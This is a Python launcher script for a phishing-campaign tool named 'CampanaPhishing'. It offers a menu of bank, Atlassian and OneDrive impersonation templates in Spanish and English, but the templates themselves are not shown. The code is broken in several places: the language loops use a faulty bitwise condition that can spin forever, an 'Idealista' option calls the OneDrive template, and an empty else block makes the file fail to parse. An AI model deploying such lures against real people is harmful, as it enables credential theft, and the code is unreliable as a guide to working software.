import time
import os
import sys
import smtplib

#Import templates Spanish
from Templates.spanish.bankEs import BankEs
from Templates.spanish.onedriveEs import OneDriveEs
from Templates.spanish.atalasianEs import AtalassianEs

#Import templates English
from Templates.english.bankEn import BankEn
from Templates.english.onedriveEn import OneDriveEn
from Templates.english.atalasianEn import AtalassianEn

#Import helpers
from helper.helper import getPath,generateFolderReport

Version="0.1"

def main():
    print("Starting CampanaPhishing --> Version: v"+Version+"\n Templates to deploy:")
    print("\n[1] Bank ")
    print("\n[2] Atalassian")
    print("\n[3] OneDrive")
    print("\nSelect your option: \n")

    #Selaction of the lenguage of the attack
    value=int(input())
    languageString="Choose language: \n[0]Spanish \n[1]English"+getPath()

    #Save path and create directory where the user save the reports
    generateFolderReport()

    #Bank Template
    if value == 1:
        print("\nBank:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                BankEs()
            else:
                #Template English
                BankEn()
    #Atalassian
    elif value ==2:
        print("\nAtalassian:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                AtalassianEs()
            else:
                #Template English
                AtalassianEn()
                
    #Onedrive Template
    elif value ==3:
        print("\nOneDrive:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                OneDriveEs()
            else:
                #Template English
                OneDriveEn()

    #
    elif value ==4:
        print("\Idealista:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                OneDriveEs()
            else:
                #Template English

    #More Templates...

    else:
        print("\nInvalid option")
        sys.exit()

main()